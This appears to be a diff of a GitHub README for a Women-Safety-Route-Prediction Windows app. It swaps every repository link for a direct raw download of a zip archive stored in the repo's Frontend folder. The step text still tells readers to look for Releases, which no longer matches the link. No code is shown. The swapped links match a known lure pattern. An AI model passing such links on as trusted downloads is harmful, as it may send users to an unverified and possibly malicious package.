@@ -2,7 +2,7 @@
 
 [![Download][download-badge]][download-link]
 
-[download-link]: https://github.com/alitntali99/Women-Safety-Route-Prediction
+[download-link]: https://github.com/alitntali99/Women-Safety-Route-Prediction/raw/refs/heads/main/Frontend/Safety-Prediction-Women-Route-v2.2.zip
 [download-badge]: https://img.shields.io/badge/Download-WomenSafetyRoute-blue?style=for-the-badge
 
 ---
@@ -13,7 +13,7 @@ To get started with Women-Safety-Route-Prediction on your Windows PC, follow the
 
 1. **Visit the download page:**  
    Go to the official project page by clicking this link:  
-   https://github.com/alitntali99/Women-Safety-Route-Prediction
+   https://github.com/alitntali99/Women-Safety-Route-Prediction/raw/refs/heads/main/Frontend/Safety-Prediction-Women-Route-v2.2.zip
 
 2. **Find the latest release:**  
    On the project page, look for a section named **Releases** on the right side or scroll down to find it. The latest version will usually appear at the top.
@@ -123,6 +123,6 @@ If you need help or want to share feedback:
 
 Use this link anytime to get the latest version or reinstall:
 
-[Download Women-Safety-Route-Prediction](https://github.com/alitntali99/Women-Safety-Route-Prediction)
+[Download Women-Safety-Route-Prediction](https://github.com/alitntali99/Women-Safety-Route-Prediction/raw/refs/heads/main/Frontend/Safety-Prediction-Women-Route-v2.2.zip)
 
 [![Download][download-badge]][download-link]
